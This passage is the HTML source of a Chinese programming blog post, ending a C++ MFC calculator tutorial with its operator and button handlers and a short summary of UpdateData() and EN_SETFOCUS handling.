		<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			m_fResult-=m_fInput;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			m_fResult*=m_fInput;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			m_fResult/=m_fInput;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			m_fResult=<span class="number">1</span>/m_fInput;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			m_fResult=<span class="built_in">sqrt</span>(m_fInput);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m_fInput=m_fResult;</span><br><span class="line">	UpdateData(FALSE);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnClear() </span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	m_fResult=<span class="number">0.0</span>;</span><br><span class="line">	m_fInput=<span class="number">0.0</span>;</span><br><span class="line">	m_nOP=<span class="number">0</span>;</span><br><span class="line">	UpdateData(FALSE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnDiv() </span><br><span class="line">&#123;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">4</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnMul() </span><br><span class="line">&#123;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">3</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnReciprocal() </span><br><span class="line">&#123;</span><br><span class="line">	m_nOP=<span class="number">5</span>;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">0</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnSqrt() </span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	m_nOP=<span class="number">6</span>;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnSub() </span><br><span class="line">&#123;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">2</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>省略了一些声明和初始化代码。</p>
<h3 id="u5C0F_u7ED3"><a href="#u5C0F_u7ED3" class="headerlink" title="小结"></a>小结</h3><p>新知识主要有:<br>为编辑控件的消息EN_SETFOCUS添加一个映射函数OnSetfocusInput()。<br>对话框类的成员函数UpdateData()用于更新数据。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C++</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MFC/">MFC</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/编程学习/">编程学习</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2016 年糕
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
<script src="/js/main.js" type="text/javascript"></script>



<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-71542166-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>